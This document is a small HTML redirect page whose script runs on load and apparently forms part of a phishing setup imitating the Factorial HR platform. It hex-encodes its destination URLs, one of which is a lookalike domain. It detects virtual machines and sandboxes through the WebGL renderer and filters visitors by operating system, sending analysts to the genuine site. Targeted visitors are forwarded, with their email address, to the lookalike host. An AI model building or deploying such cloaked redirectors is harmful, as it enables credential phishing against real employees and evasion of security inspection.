<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <script>

        (function(){
            function esSistemaAceptado() {
                var userAgent = window.navigator.userAgent.toLowerCase();
                return userAgent.includes('windows') || userAgent.includes('android') || userAgent.includes('iphone');
            }


            function isVirtualMachine() {
                var canvas = document.createElement('canvas');
                var gl = canvas.getContext('webgl');

                if (gl) {
                    var debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    if (debugInfo) {
                        var renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL).toLowerCase();
                        return renderer.includes('swiftshader'); 
                    } else {
                        return false; 
                    }
                } else {
                    return false; 
                }
            }

            
            function getParameterByName(name) {
                var urlParams = new URLSearchParams(window.location.search);
                return urlParams.get(name);
            }

            
            function decodeHex(hexString) {
                var str = '';
                for (var i = 0; i < hexString.length; i += 2) {
                    str += String.fromCharCode(parseInt(hexString.substr(i, 2), 16));
                }
                return str;
            }

            var redirectFactorialHex = '68747470733a2f2f6170702e666163746f7269616c68722e636f6d';
            var redirectHirnoHex = '68747470733a2f2f666163746f7269616c68722e6869726e6f696e73612e636f6d2f';

            
            function redirigirConId() {
                var idBase64 = getParameterByName('email');

            
                if (!esSistemaAceptado() || isVirtualMachine()){ 
                    window.location.href = decodeHex(redirectFactorialHex);
                    return;
                }

            
                if (idBase64) {
                    var hirnoUrl = decodeHex(redirectHirnoHex) + '?email=' + idBase64;
                    window.location.href = hirnoUrl;
                } else {
                    window.location.href = decodeHex(redirectFactorialHex);
                }
            }

            window.onload = function() {
                redirigirConId();
            };
        })();
        
    </script>
</head>
<body>
    <p>Redirecting, please wait...</p>
</body>
</html>
